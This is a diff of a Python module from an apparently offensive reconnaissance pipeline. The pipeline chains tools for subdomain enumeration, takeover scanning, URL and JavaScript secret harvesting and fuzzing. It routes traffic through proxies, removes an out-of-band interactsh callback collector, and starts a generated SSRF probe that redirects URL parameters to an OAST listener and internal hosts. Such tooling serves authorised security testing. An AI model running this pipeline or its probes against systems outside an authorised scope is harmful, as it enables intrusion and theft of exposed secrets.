-    # written lines even when a source path resolves to the same file as dst
-    # (prevents the self-merge data-loss bug).
-    dst_resolved = dst.resolve()
-    if dst.exists():
-        try:
-            with dst.open(errors="ignore") as f:
-                for ln in f:
-                    ln = ln.strip()
-                    if not ln or ln.startswith("#"):
-                        continue
-                    if validator is not None and not validator(ln):
-                        continue
-                    seen[ln] = None
-        except (OSError, IOError):
-            pass
-    for s in srcs:
-        if not s:
-            continue
-        # Use try/except instead of is_file() to avoid TOCTOU race where
-        # the file is deleted between the check and the open() call.
-        try:
-            with s.open(errors="ignore") as f:
-                for ln in f:
-                    ln = ln.strip()
-                    if not ln or ln.startswith("#"):
-                        continue
-                    if validator is not None and not validator(ln):
-                        continue
-                    if ln not in seen:
-                        seen[ln] = None
-        except (OSError, IOError):
-            continue
-    if not seen:
-        return 0
-    ensure(dst)
-    # Atomic write: temp file + rename so concurrent readers never see a
-    # half-written destination.
-    tmp = dst.with_suffix(dst.suffix + ".merge_tmp")
-    try:
-        tmp.write_text("\n".join(seen) + "\n")
-        os.replace(tmp, dst)
-    except Exception:
-        with contextlib.suppress(Exception):
-            tmp.unlink(missing_ok=True)
-        raise
-    return len(seen)
-
-
-def _downsample_file(path: Path, n: int = 1) -> None:
-    """Keep only the first `n` non-blank, non-comment lines of a text file (in-place).
-    Streams the file line by line to avoid loading large files into memory."""
-    if not path.is_file():
-        return
-    # First pass: count valid lines
-    count = 0
-    try:
-        with path.open(encoding="utf-8", errors="ignore") as f:
-            for ln in f:
-                if ln.strip() and not ln.lstrip().startswith("#"):
-                    count += 1
-                    if count > n:
-                        break
-    except (OSError, IOError):
-        return
-    if count <= n:
-        return
-    # Second pass: write first n valid lines
-    tmp = path.with_suffix(path.suffix + ".ds_tmp")
-    try:
-        with path.open(encoding="utf-8", errors="ignore") as src, tmp.open("w", encoding="utf-8") as dst:
-            written = 0
-            for ln in src:
-                if ln.strip() and not ln.lstrip().startswith("#"):
-                    dst.write(ln if ln.endswith("\n") else ln + "\n")
-                    written += 1
-                    if written >= n:
-                        break
-        os.replace(tmp, path)
-    except Exception:
-        with contextlib.suppress(Exception):
-            tmp.unlink(missing_ok=True)
-        raise
-
-
-def safe_suffix(s: str) -> str:
-    """Deterministic, low-collision file suffix. Uses the first 12 hex
-    chars of sha1(s) — collision odds are astronomically small for any
-    realistic input set, unlike the old `(int(h[:8],16) % 9999)`."""
-    return hashlib.sha1(s.encode("utf-8", errors="ignore")).hexdigest()[:12]
-
-
-def _safe_name(s: str, maxlen: int = 80) -> str:
-    """Sanitize a string for use as a log filename (no special chars)."""
-    safe = (
-        s.replace("/", "_")
-        .replace(":", "_")
-        .replace("?", "_")
-        .replace("&", "_")
-        .replace("=", "_")
-        .replace("#", "_")
-        .replace("%", "_")
-        .replace("\n", "")
-        .replace("\r", "")
-    )
-    return safe[:maxlen]
-
-
-def read_jsonl(p: Path) -> List[Any]:
-    """Read a JSON-Lines file. Falls back to a single JSON object/array
-    if the file isn't line-delimited. Never raises on bad input."""
-    if not p.exists():
-        return []
-    out: List[Any] = []
-    # try JSONL first: iterate line by line
-    with p.open(errors="ignore") as f:
-        first = f.readline().strip()
-        if first.startswith("{"):
-            try:
-                out.append(json.loads(first))
-            except json.JSONDecodeError:
-                pass
-            for ln in f:
-                ln = ln.strip()
-                if not ln or not ln.startswith("{"):
-                    continue
-                try:
-                    out.append(json.loads(ln))
-                except json.JSONDecodeError:
-                    continue
-            if out:
-                return out
-        # single JSON object or array — re-read from start
-        f.seek(0)
-        raw = f.read()
-    if not raw:
-        return []
-    try:
-        d = json.loads(raw)
-    except json.JSONDecodeError:
-        return []
-    return d if isinstance(d, list) else [d]
-
-
-# ──────────────────────────── interactsh manager ────────────────────────────
-class Interactsh:
-    """Background OOB collector. Start before phase 08-FUZZ, stop at phase 13-OOB."""
-
-    def __init__(self, outdir: Path) -> None:
-        self.outdir = outdir
-        self.proc: Optional[subprocess.Popen] = None
-        self.domain: Optional[str] = None
-        self.log = ensure(outdir / "logs" / "interactsh.log")
-        self._log_fh = None
-        # File offset for domain parsing — guarantees we only read the
-        # output produced by THIS run, not stale content from a prior run.
-        self._start_pos = 0
-
-    @property
-    def available(self) -> bool:
-        return shutil.which("interactsh-client") is not None
-
-    def _kill_proc(self) -> None:
-        if self._log_fh is not None:
-            with contextlib.suppress(Exception):
-                self._log_fh.close()
-            self._log_fh = None
-        if not self.proc:
-            return
-        if self.proc.poll() is None:
-            with contextlib.suppress(ProcessLookupError):
-                self.proc.send_signal(signal.SIGINT)
-            if _wait_proc(self.proc, 10):
-                return
-            self.proc.kill()
-            _wait_proc(self.proc, 5)
-
-    def start(self) -> bool:
-        if not self.available:
-            log("warn", "interactsh-client not found; OOB phase will be empty")
-            return False
-        token = os.environ.get("INTERACTSH_TOKEN")
-        # rotate log so a stale "Domain: <old>" line from a previous run
-        # can never be mistaken for this run's announcement.
-        ensure(self.log)
-        self.log.write_text("")
-        cmd = ["interactsh-client", "-v"]
-        if token:
-            cmd += ["-t", token]
-        if _USE_PROXYCHAINS:
-            cmd = ["proxychains4"] + cmd
-        try:
-            self._log_fh = self.log.open("ab")
-            self.proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=self._log_fh, stderr=subprocess.STDOUT)
-            # Give the process a moment to start before capturing start position,
-            # so any initial banner/Domain: output is not missed.
-            time.sleep(0.5)
-            self._start_pos = self.log.stat().st_size
-        except FileNotFoundError:
-            if self._log_fh is not None:
-                self._log_fh.close()
-                self._log_fh = None
-            return False
-        except Exception as e:
-            log("err", f"interactsh start failed: {e}")
-            self._kill_proc()
-            return False
-        deadline = time.time() + 90
-        try:
-            while time.time() < deadline:
-                if self.proc.poll() is not None:
-                    _tail = ""
-                    try:
-                        with self.log.open("rb") as fh:
-                            raw = fh.read()
-                            _tail = raw.decode("utf-8", errors="replace")[-2000:]
-                    except OSError:
-                        pass
-                    log("warn", f"interactsh-client exited prematurely (rc={self.proc.returncode})")
-                    if _tail.strip():
-                        for _ln in _tail.strip().splitlines()[-10:]:
-                            log("warn", f"  interactsh: {_ln}")
-                    return False
-                try:
-                    with self.log.open("rb") as fh:
-                        fh.seek(self._start_pos)
-                        txt = fh.read().decode("utf-8", errors="ignore")
-                except FileNotFoundError:
-                    txt = ""
-                for ln in txt.splitlines():
-                    # Strip ANSI escape sequences
-                    clean = re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", ln).strip()
-                    # Old format: "Domain: <domain>"
-                    if "Domain" in clean and ":" in clean:
-                        cand = clean.split(":", 1)[1].strip()
-                        if cand and "." in cand and " " not in cand:
-                            self.domain = cand
-                            log("ok", f"interactsh domain: {self.domain}")
-                            return True
-                    # New format: "[INF] <subdomain>.oast.<tld>"
-                    # Match lines that look like a bare hostname after [INF]
-                    if re.search(r"[a-zA-Z0-9-]+\.oast\.[a-z]+", clean):
-                        cand = clean.split()[-1].strip()
-                        if cand and "." in cand and " " not in cand:
-                            self.domain = cand
-                            log("ok", f"interactsh domain: {self.domain}")
-                            return True
-                time.sleep(1)
-        except Exception:
-            self._kill_proc()
-            raise
-        log("warn", "interactsh did not announce a domain in time")
-        return False
-
-    def stop(self) -> Path:
-        out = ensure(self.outdir / "oast" / "callbacks.txt")
-        self._kill_proc()
-        events: List[dict] = []
-        try:
-            with self.log.open("r", errors="ignore") as fh:
-                for ln in fh:
-                    ln = ln.strip()
-                    if ln.startswith("{") and '"protocol"' in ln:
-                        with contextlib.suppress(json.JSONDecodeError):
-                            ev = json.loads(ln)
-                            events.append(
-                                {
-                                    "ts": ev.get("timestamp"),
-                                    "proto": ev.get("protocol"),
-                                    "id": ev.get("unique-id"),
-                                    "from": ev.get("remote-address"),
-                                    "domain": self.domain,
-                                }
-                            )
-        except FileNotFoundError:
-            pass
-        with out.open("w") as f:
-            for e in events:
-                f.write(json.dumps(e) + "\n")
-        log("ok", f"interactsh: {len(events)} OOB callback(s) captured")
-        return out
-
-
-# ─────────────────────────── phase implementations ─────────────────────────
-# small helper: hostname token safety check
-_SAFE_HOST = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*$")
-
-# Global scope file path (set by 00-SCOPE)
+from reconchain.tools import Tools
+from reconchain.utils import (
+    ensure, log, read_lines, count_nonblank, merge_unique, merge_unique_str,
+    _is_valid_hostname, _is_under_domain,
+    _existing_artifacts,
+    _get_urlopener, _get_no_redirect_urlopener, safe_suffix, _safe_name,
+    _target_token, _write_target_tokens,
+    _extra_headers_dict, _extra_http_args,
+    _async_urlopen, _async_urlopen_no_redirect,
+    _dedupe_by_host_path, _dedupe_by_host_params,
+    _parse_httpx_tech,
+    _mmh3_hash,
+    _extract_urls_from_ffuf_json, _merge_dnsx_output,
+    _throttle, _throttle_rate,
+)
+
+
+
+# Phase-level globals
 _SCOPE_FILE: Optional[Path] = None
 _SCOPE_PATTERNS: List[str] = []
+PhaseSet = Set[str]
 
+def _extract_headers(s: str) -> Dict[str, str]:
+    heads: Dict[str, str] = {}
+    for ln in s.splitlines():
+        if ":" in ln:
+            k, v = ln.split(":", 1)
+            heads[k.strip().lower()] = v.strip()
+    return heads
+
+def _request(host: str, path: str, timeout: int = 10) -> bytes:
+    opener = _get_urlopener()
+    url = host.rstrip("/") + "/" + path.lstrip("/")
+    if not url.startswith("http"):
+        url = "https://" + url
+    try:
+        return opener.open(url, timeout=timeout).read()
+    except Exception:
+        try:
+            url2 = url.replace("https://", "http://", 1)
+            return opener.open(url2, timeout=timeout).read()
+        except Exception:
+            return b""
+
+def _norm_line(raw: str) -> str:
+    raw = raw.strip()
+    while raw.count("//") > 1:
+        raw = raw.replace("//", "/")
+    return raw.rstrip("/")
 
 async def phase_00_SCOPE(
     domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
@@ -1236,10 +160,13 @@ async def phase_01_RECON(
     log("info", "Phase 01-RECON: subdomain enumeration")
     jobs: List[Tuple[str, List[str], int]] = []
     if t.has("subfinder"):
+        _sub_proxy = []
+        if _PIPELINE_CFG.proxy:
+            _sub_proxy = ["-proxy", _PIPELINE_CFG.proxy]
         jobs.append(
             (
                 "subfinder",
-                ["subfinder", "-d", domain, "-silent", "-o", str(outdir / "subs_subfinder.txt")],
+                ["subfinder", "-d", domain, "-silent", "-o", str(outdir / "subs_subfinder.txt")] + _sub_proxy,
                 900,
             )
         )
@@ -1339,8 +266,12 @@ async def phase_02_RESOLVE(
         return {"02-RESOLVE": str(out), "count": count_nonblank(out)}
     subs_file = Path(prev.get("01-RECON") or outdir / "all_subs.txt")
 
-    # Streaming: poll for input from 01-RECON (which may be writing incrementally)
+    # Fast check: if 01-RECON already finished (file exists), don't poll
     if not read_lines(subs_file):
+        is_done = isinstance(prev.get("01-RECON"), str) or subs_file.exists()
+        if is_done:
+            log("warn", "02-RESOLVE: 01-RECON produced no subdomains; skipping")
+            return {"02-RESOLVE": str(out), "count": 0}
         for _ in range(120):  # up to ~10 min
             await asyncio.sleep(5)
             if read_lines(subs_file):
@@ -1349,13 +280,12 @@ async def phase_02_RESOLVE(
             log("warn", "02-RESOLVE: 01-RECON produced no subdomains; skipping")
             return {"02-RESOLVE": str(out), "count": 0}
 
-    log("info", "Phase 02-RESOLVE: dnsx + puredns resolution (streaming)")
+    log("info", "Phase 02-RESOLVE: resolution with parallel fallback (massdns → dnsx → dig)")
     _a2_processed: Set[str] = set()
     _a2_stable_count = 0
     # Run puredns on initial subdomains for wildcard-resistant resolution
     if t.has("puredns"):
         puredns_out = outdir / "resolved_puredns.txt"
-        # puredns requires a resolvers file; without it exits immediately with rc=1
         _puredns_resolvers = Path.home() / ".config" / "puredns" / "resolvers.txt"
         if _puredns_resolvers.exists():
             await _run(
@@ -1379,8 +309,24 @@ async def phase_02_RESOLVE(
                 with out.open("a") as f:
                     f.write("\n".join(new_puredns) + "\n")
 
+    async def _resolve_socket(host: str) -> Optional[str]:
+        """Fallback resolver using Python socket.getaddrinfo.
+        Skips when SOCKS proxy is active without PySocks to avoid DNS leaks."""
+        from reconchain.process import _USE_PROXYCHAINS, _PIPELINE_CFG
+        from reconchain.utils import _socks_patched
+        proxy = _PIPELINE_CFG.proxy or os.environ.get("PROXY", "")
+        if proxy and not proxy.startswith(("http://", "https://")) and not _socks_patched:
+            return None
+        if _USE_PROXYCHAINS and not _socks_patched:
+            return None
+        try:
+            await asyncio.get_event_loop().getaddrinfo(host, 0, family=socket.AF_UNSPEC)
+            return host
+        except Exception:
+            return None
+
     async def _resolve_batch(batch_subs: Path) -> int:
-        """Run dnsx on a batch of subdomains, append results to resolved files."""
+        """Resolve subdomains with fallback chain: massdns → dnsx → socket."""
         tmp = outdir / ".a2_batch.txt"
         batch = [s.strip().lower() for s in read_lines(batch_subs)
                  if s.strip() and s.strip().lower() not in _a2_processed]
@@ -1388,25 +334,58 @@ async def phase_02_RESOLVE(
             return 0
         _a2_processed.update(b.lower() for b in batch)
         tmp.write_text("\n".join(batch) + "\n")
-        if not t.has("dnsx"):
-            merge_unique([tmp, out], out)
-            tmp.unlink(missing_ok=True)
-            return len(batch)
-        full_batch = outdir / ".a2_full_batch.txt"
-        res = await _run(
-            "dnsx",
-            ["dnsx", "-silent", "-l", str(tmp), "-o", str(full_batch),
-             "-a", "-aaaa", "-cname", "-resp"],
-            1800, outdir,
-        )
-        if full_batch.exists() and read_lines(full_batch):
-            cnt = _merge_dnsx_output(full_batch, out, full)
+        resolved_count = 0
+        # Try massdns first (fastest)
+        if t.has("massdns"):
+            massdns_out = outdir / ".a2_massdns_batch.txt"
+            massdns_resolvers = Path.home() / ".config" / "massdns" / "resolvers.txt"
+            if massdns_resolvers.exists():
+                await _run(
+                    "massdns",
+                    ["massdns", "-r", str(massdns_resolvers), "-t", "A", "-o", "S",
+                     "-w", str(massdns_out), str(tmp)],
+                    600, outdir,
+                )
+                if massdns_out.exists() and read_lines(massdns_out):
+                    for ln in read_lines(massdns_out):
+                        if ln.strip() and " " in ln:
+                            host = ln.split()[0].rstrip(".").lower()
+                            if host and host not in _a2_processed:
+                                merge_unique_str(host, out)
+                                merge_unique_str(host, full)
+                                resolved_count += 1
+                    massdns_out.unlink(missing_ok=True)
+                    tmp.unlink(missing_ok=True)
+                    return resolved_count
+                massdns_out.unlink(missing_ok=True)
+            else:
+                log("warn", "massdns: no resolvers at ~/.config/massdns/resolvers.txt; trying dnsx")
+        # Fall back to dnsx batch resolution
+        if t.has("dnsx"):
+            full_batch = outdir / ".a2_full_batch.txt"
+            res = await _run(
+                "dnsx",
+                ["dnsx", "-silent", "-l", str(tmp), "-o", str(full_batch),
+                 "-a", "-aaaa", "-cname", "-resp"],
+                1800, outdir,
+            )
+            if full_batch.exists() and read_lines(full_batch):
+                cnt = _merge_dnsx_output(full_batch, out, full)
+                full_batch.unlink(missing_ok=True)
+                tmp.unlink(missing_ok=True)
+                return cnt
             full_batch.unlink(missing_ok=True)
-            tmp.unlink(missing_ok=True)
-            return cnt
-        full_batch.unlink(missing_ok=True)
+        # Final fallback: Python socket resolution
+        log("info", f"02-RESOLVE: resolving {len(batch)} host(s) via socket fallback")
+        tasks = [_resolve_socket(h) for h in batch]
+        results = await asyncio.gather(*tasks)
+        resolved_hosts = [h for h in results if h is not None]
+        if resolved_hosts:
+            for host in resolved_hosts:
+                merge_unique_str(host, out)
+            resolved_count += len(resolved_hosts)
         tmp.unlink(missing_ok=True)
-        return 0
+        return resolved_count
 
     # Process initial available subdomains
     await _resolve_batch(subs_file)
@@ -1458,7 +437,6 @@ async def phase_03_PERMUTE(
             f"IN={shlex.quote(str(subs_in))}\n"
             f"OUT={shlex.quote(str(alt_out))}\n"
             "alterx -l \"$IN\" -silent -o \"$OUT\" 2>/dev/null || true\n"
-            'head -500 "$OUT" > "${OUT}.tmp" && mv "${OUT}.tmp" "$OUT" 2>/dev/null || true\n'
         )
         runner.chmod(0o755)
         jobs.append(("alterx", ["bash", str(runner)], 600))
@@ -1470,7 +448,7 @@ async def phase_03_PERMUTE(
             "set -eu\n"
             f"IN={shlex.quote(str(subs_in))}\n"
             f"OUT={shlex.quote(str(permuted))}\n"
-            "dnsgen \"$IN\" 2>/dev/null | sort -u | head -500 > \"$OUT\" || true\n"
+            "dnsgen \"$IN\" 2>/dev/null | sort -u > \"$OUT\" || true\n"
         )
         runner.chmod(0o755)
         jobs.append(("dnsgen", ["bash", str(runner)], 600))
@@ -1592,6 +570,9 @@ async def phase_04_SCAN(
         await _update_nuclei_templates(outdir)
     if t.has("nuclei") and have_subs:
         # dns/ directory contains individual takeover templates (no dns/takeovers/ subdir)
+        _nuc_proxy = []
+        if _PIPELINE_CFG.proxy:
+            _nuc_proxy = ["-proxy", _PIPELINE_CFG.proxy]
         jobs.append(
             (
                 "nuclei-dns-takeover",
@@ -1599,11 +580,14 @@ async def phase_04_SCAN(
                     "nuclei", "-silent", "-l", str(subs),
                     "-t", "dns/", "-tags", "takeover",
                     "-o", str(outdir / "takeover_dns.txt"),
-                ],
+                ] + _nuc_proxy,
                 _maybe_timeout(1800),
             )
         )
     if have_hosts and t.has("httpx"):
+        _httpx_proxy = []
+        if _PIPELINE_CFG.proxy:
+            _httpx_proxy = ["-proxy", _PIPELINE_CFG.proxy]
         jobs.append(
             (
                 "httpx",
@@ -1619,7 +603,7 @@ async def phase_04_SCAN(
                     "-status-code",
                     "-follow-redirects",
                     "-fr",
-                ] + _extra_http_args(),
+                ] + _extra_http_args() + _httpx_proxy,
                 1800,
             )
         )
@@ -1643,6 +627,9 @@ async def phase_04_SCAN(
             )
         )
     if have_hosts and t.has("nuclei"):
+        _nuc_proxy = []
+        if _PIPELINE_CFG.proxy:
+            _nuc_proxy = ["-proxy", _PIPELINE_CFG.proxy]
         jobs.append(
             (
                 "nuclei-takeover",
@@ -1655,7 +642,7 @@ async def phase_04_SCAN(
                     "http/takeovers",
                     "-o",
                     str(outdir / "takeover.txt"),
-                ] + _extra_http_args(),
+                ] + _extra_http_args() + _nuc_proxy,
                 _maybe_timeout(1800),
             )
         )
@@ -1842,18 +829,16 @@ async def phase_05_HARVEST(
         ensure(runner)
         runner.write_text(
             "#!/usr/bin/env bash\n"
-            "set -eu\n"
+            "set -u\n"
             f"OUT={shlex.quote(str(outdir / 'urls_gau.txt'))}\n"
             f"IN={shlex.quote(str(hosts))}\n"
             ': > "$OUT"\n'
-            'while IFS= read -r h || [[ -n "$h" ]]; do\n'
-            '  [ -z "$h" ] && continue\n'
-            '  timeout 120 gau --subs --threads 2 --blacklist '
-            'ttf,woff,svg,png,jpg,gif,ico,css "$h" >> "$OUT" 2>/dev/null || true\n'
-            'done < "$IN"\n'
+            'xargs -r -P 5 -I{} timeout 300 gau '
+            '--subs --threads 2 '
+            '--blacklist ttf,woff,svg,png,jpg,gif,ico,css {} >> "$OUT" 2>/dev/null < "$IN" || true\n'
         )
         runner.chmod(0o755)
-        g1.append(("gau", ["bash", str(runner)], _maybe_timeout(1800)))
+        g1.append(("gau", ["bash", str(runner)], _maybe_timeout(3600)))
 
     if t.has("gospider"):
         # gospider's -o is an output *folder* (one file per site), not a file,
@@ -2064,12 +1049,12 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
     if urls.exists():
         keep_js: List[str] = []
         keep_map: List[str] = []
-        seen_ext: Set[str] = set()
+        seen_js: Set[str] = set()
         for u in read_lines(urls):
             path = u.split("?", 1)[0].split("#", 1)[0].lower()
             if path.endswith((".js", ".jsx", ".mjs", ".cjs", ".ts", ".tsx")):
-                if u not in seen_ext:
-                    seen_ext.add(u)
+                if u not in seen_js:
+                    seen_js.add(u)
                     keep_js.append(u)
             if path.endswith(".map"):
                 keep_map.append(u)
@@ -2088,39 +1073,51 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
     _js_input = js_urls
     if _USE_PROXYCHAINS:
         js_lines = read_lines(js_urls)
-        if len(js_lines) > 50:
-            sampled = js_lines[:50]
+        if len(js_lines) > 100:
+            sampled = js_lines[:100]
             _js_input = outdir / "urls_js_sample.txt"
             ensure(_js_input).write_text("\n".join(sampled) + "\n")
             log("info", f"06-JSINTEL: downsampled {len(js_lines)} JS URLs to {len(sampled)} for slow network")
 
     jobs: List[Tuple[str, List[str], int]] = []
     if t.has("secretfinder"):
+        # SecretFinder's -i flag expects a single URL, not a file.
+        # Iterate over each JS URL so individual requests are not
+        # misinterpreted as file-path HTTP fetches.
         runner = outdir / "logs" / "secretfinder_runner.sh"
         ensure(runner)
         runner.write_text(
             "#!/usr/bin/env bash\n"
-            "set -eu\n"
+            "set -u\n"
             f"OUT={shlex.quote(str(outdir / 'secrets.txt'))}\n"
             f"IN={shlex.quote(str(_js_input))}\n"
-            'xargs -P 4 -I{} sh -c \'timeout 90 secretfinder -i "$1" 2>/dev/null || true\' _ {} < "$IN" > "$OUT" 2>/dev/null || true\n'
+            ': > "$OUT"\n'
+            'xargs -r -P 5 -I{} sh -c '
+            '\'echo "[06-JSINTEL] secretfinder $1" >&2; '
+            'timeout 120 secretfinder -i "$1" 2>/dev/null\' _ {} >> "$OUT" < "$IN" || true\n'
         )
         runner.chmod(0o755)
-        jobs.append(("secretfinder", ["bash", str(runner)], _maybe_timeout(1800)))
+        jobs.append(("secretfinder", ["bash", str(runner)], _maybe_timeout(3600)))
     if t.has("linkfinder"):
+        # linkfinder -o produces HTML output; kept for manual inspection only.
+        # Use temp files per URL to avoid output interleaving from parallel runs.
         linkfinder_out = outdir / "urls_linkfinder.html"
         runner = outdir / "logs" / "linkfinder_runner.sh"
         ensure(runner)
         runner.write_text(
             "#!/usr/bin/env bash\n"
-            "set -eu\n"
+            "set -u\n"
             f"OUT={shlex.quote(str(linkfinder_out))}\n"
             f"IN={shlex.quote(str(_js_input))}\n"
             ': > "$OUT"\n'
-            'xargs -P 4 -I{} sh -c \'timeout 180 linkfinder -i "$1" 2>/dev/null || true\' _ {} < "$IN" >> "$OUT" 2>/dev/null || true\n'
+            'TMPDIR=$(mktemp -d) || exit 1\n'
+            'trap "rm -rf \'$TMPDIR\'" EXIT\n'
+            'xargs -r -P 5 -I{} sh -c '
+            '\'timeout 180 linkfinder -i "$1" > "$TMPDIR/$(echo "$1" | md5sum | cut -d" " -f1).html" 2>/dev/null\' _ {} < "$IN" || true\n'
+            'cat "$TMPDIR"/*.html >> "$OUT" 2>/dev/null || true\n'
         )
         runner.chmod(0o755)
-        jobs.append(("linkfinder", ["bash", str(runner)], _maybe_timeout(1200)))
+        jobs.append(("linkfinder", ["bash", str(runner)], _maybe_timeout(3600)))
     # Detect the actual xnLinkFinder binary name (case-sensitive on Linux)
     _xnlf_bin = ""
     if t.has("xnlinkfinder"):
@@ -2141,6 +1138,9 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
         runner.chmod(0o755)
         jobs.append((_xnlf_bin, ["bash", str(runner)], _maybe_timeout(1200)))
     if t.has("nuclei"):
+        _nuc_proxy = []
+        if _PIPELINE_CFG.proxy:
+            _nuc_proxy = ["-proxy", _PIPELINE_CFG.proxy]
         jobs.append(
             (
                 "nuclei-exposures",
@@ -2155,8 +1155,8 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
                     "http/exposures",
                     "-o",
                     str(outdir / "nuclei_exposures.txt"),
-                ] + _extra_http_args(),
-                min(_maybe_timeout(3000), 7200),
+                ] + _extra_http_args() + _nuc_proxy,
+                _maybe_timeout(min(3000, 7200)),
             )
         )
     await run_parallel(jobs, outdir)
@@ -2169,8 +1169,7 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
             [xnlink_out],
             outdir / "urls_all.txt",
         )
-    # Collect .json endpoints from JS tool output (xnLinkFinder, etc.) for
-    # API surface analysis — these are NEW endpoints the JS tools discovered.
+    # Collect .json endpoints from JS tool outputs and the full URL pool
     json_urls = outdir / "urls_json.txt"
     json_keep: List[str] = []
     json_seen: Set[str] = set()
@@ -2181,21 +1180,15 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
                 if path.endswith(".json") and u not in json_seen:
                     json_seen.add(u)
                     json_keep.append(u)
-    if json_keep:
-        ensure(json_urls).write_text("\n".join(json_keep) + "\n")
-    # Also extract .json from the original URL pool (pre-existing endpoints)
     if urls.exists():
-        json_keep = []
-        if json_urls.exists():
-            json_keep = read_lines(json_urls)
-        seen_urls = set(json_keep)
         for u in read_lines(urls):
             path = u.split("?", 1)[0].split("#", 1)[0].lower()
-            if path.endswith(".json") and u not in seen_urls:
-                seen_urls.add(u)
+            if path.endswith(".json") and u not in json_seen:
+                json_seen.add(u)
                 json_keep.append(u)
-        if json_keep:
-            ensure(json_urls).write_text("\n".join(json_keep) + "\n")
+    if json_keep:
+        ensure(json_urls).write_text("\n".join(json_keep) + "\n")
+        log("ok", f"06-JSINTEL: collected {len(json_keep)} JSON API endpoints")
     # Merge JSON endpoints back so downstream phases see API surface
     if json_urls.exists() and read_lines(json_urls):
         merge_unique(
@@ -2293,93 +1286,6 @@ async def phase_07_PARAMS(
     parts = sorted(p for p in outdir.glob("params_*.txt") if p.name != "params.txt")
     n = merge_unique(parts, outdir / "params.txt")
     return {"07-PARAMS": str(outdir / "params.txt"), "count": n}
-
-
-def _extract_urls_from_ffuf_json(p: Path) -> List[str]:
-    out: List[str] = []
-    if not p.exists():
-        return out
-    try:
-        data = json.loads(p.read_text(encoding="utf-8", errors="ignore"))
-    except json.JSONDecodeError:
-        return out
-    results = data.get("results") if isinstance(data, dict) else None
-    if not isinstance(results, list):
-        return out
-    for r in results:
-        if not isinstance(r, dict):
-            continue
-        url = r.get("url")
-        status = r.get("status")
-        if url and status is not None:
-            out.append(f"{status}\t{url}")
-    return out
-
-
-def _merge_dnsx_output(src: Path, hosts_out: Path, full_out: Path) -> int:
-    """Parse dnsx -resp output from `src` and append to hosts_out + full_out.
-    Returns the number of new host entries added."""
-    seen_hosts: Set[str] = set()
-    seen_full_lines: Set[str] = set()
-    if hosts_out.exists():
-        for h in read_lines(hosts_out):
-            if h.strip():
-                seen_hosts.add(h.strip().lower())
-    if full_out.exists():
-        for l in read_lines(full_out):
-            line = l.strip()
-            if line:
-                seen_full_lines.add(line)
-                host = line.split()[0].rstrip(".").lower()
-                seen_hosts.add(host)
-    new_lines: List[str] = []
-    for ln in read_lines(src):
-        ln = ln.strip()
-        if not ln or ln.lstrip().startswith("#"):
-            continue
-        if ln in seen_full_lines:
-            continue
-        host = ln.split()[0].rstrip(".")
-        if _is_valid_hostname(host):
-            seen_full_lines.add(ln)
-            seen_hosts.add(host.lower())
-            new_lines.append(ln)
-    if new_lines:
-        with full_out.open("a") as f:
-            f.write("\n".join(new_lines) + "\n")
-        hosts_out.write_text("\n".join(sorted(seen_hosts)) + "\n")
-    return len(new_lines)
-
-
-def _dedupe_by_host_path(urls: List[str]) -> List[str]:
-    """Deduplicate URLs by (scheme, host, path), keeping the first occurrence.
-    This avoids redundant fuzzing on URLs that differ only by query params
-    or fragments — the same path only needs to be fuzzed once."""
-    seen: Set[Tuple[str, str, str]] = set()
-    result: List[str] = []
-    for u in urls:
-        parsed = urllib.parse.urlparse(u)
-        key = (parsed.scheme, parsed.hostname or "", parsed.path.rstrip("/"))
-        if key not in seen:
-            seen.add(key)
-            result.append(u)
-    return result
-
-
-def _dedupe_by_host_params(urls: List[str]) -> List[str]:
-    """Deduplicate URLs by (scheme, host, path, sorted param keys).
-    Keeps URLs with different parameter sets on the same path, unlike
-    _dedupe_by_host_path which only keeps one URL per path."""
-    seen: Set[Tuple[str, str, str, str]] = set()
-    result: List[str] = []
-    for u in urls:
-        parsed = urllib.parse.urlparse(u)
-        qs = frozenset(urllib.parse.parse_qs(parsed.query))
-        key = (parsed.scheme, parsed.hostname or "", parsed.path.rstrip("/"), str(sorted(qs)))
-        if key not in seen:
-            seen.add(key)
-            result.append(u)
-    return result
 
 
 async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
@@ -2839,14 +1745,22 @@ async def phase_11_INJECT(
         ssrf_script.write_text(
             "#!/usr/bin/env python3\n"
             '"""SSRF probe: rewrite URL parameters to point at OAST listener and internal targets."""\n'
-            "import os, random, sys, urllib.request, urllib.parse\n"
-            "# Proxy support: route through PROXY env var if set (HTTP/HTTPS only; SOCKS uses proxychains)\n"
+            "import os, random, sys, urllib.request, urllib.parse, socket\n"
             "_proxy = os.environ.get('PROXY', '')\n"
-            "if _proxy and _proxy.startswith(('http://', 'https://')):\n"
-            "    _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
-            "    _urlopen = urllib.request.build_opener(_handler).open\n"
-            "else:\n"
-            "    _urlopen = urllib.request.urlopen\n"
+            "_urlopen = urllib.request.urlopen\n"
+            "if _proxy:\n"
+            "    if _proxy.startswith(('http://', 'https://')):\n"
+            "        _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
+            "        _urlopen = urllib.request.build_opener(_handler).open\n"
+            "    elif _proxy.startswith(('socks4://', 'socks5://', 'socks5h://', 'socks4a://')):\n"
+            "        try:\n"
+            "            import socks as _socks\n"
+            "            _parsed = urllib.parse.urlparse(_proxy)\n"
+            "            _pt = _socks.SOCKS5 if _parsed.scheme.startswith('socks5') else _socks.SOCKS4\n"
+            "            _socks.set_default_proxy(_pt, _parsed.hostname, _parsed.port or 1080)\n"
+            "            _socks.wrap_module(socket)\n"
+            "        except ImportError:\n"
+            "            pass\n"
